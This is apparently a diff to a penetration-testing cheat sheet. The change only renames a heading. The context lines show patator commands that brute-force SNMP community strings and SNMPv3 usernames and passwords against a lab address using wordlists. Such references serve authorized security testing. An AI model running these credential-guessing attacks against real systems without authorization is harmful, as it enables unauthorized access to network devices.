@@ -430,7 +430,7 @@ patator snmp_login host=10.10.10.10 community=FILE0 0='<passwords.txt>' -x ignor
 ```
 patator snmp_login host=10.10.10.10 version=3 user=FILE0 0=users.txt -x ignore:mesg='Unknown USM user'
 ```
-#### SNMPv3 dictionary attack
+#### SNMPv3 dictionary attack (Patator)
 ```
 patator snmp_login host=10.10.10.10 version=3 user=<user> auth_proto=md5 auth_key=FILE0 0=passwords.txt -x ignore:mesg='Wrong SNMP PDU digest' -x ignore:mesg='SNMPv3 requires passwords to be at least 8 characters long'
 ```
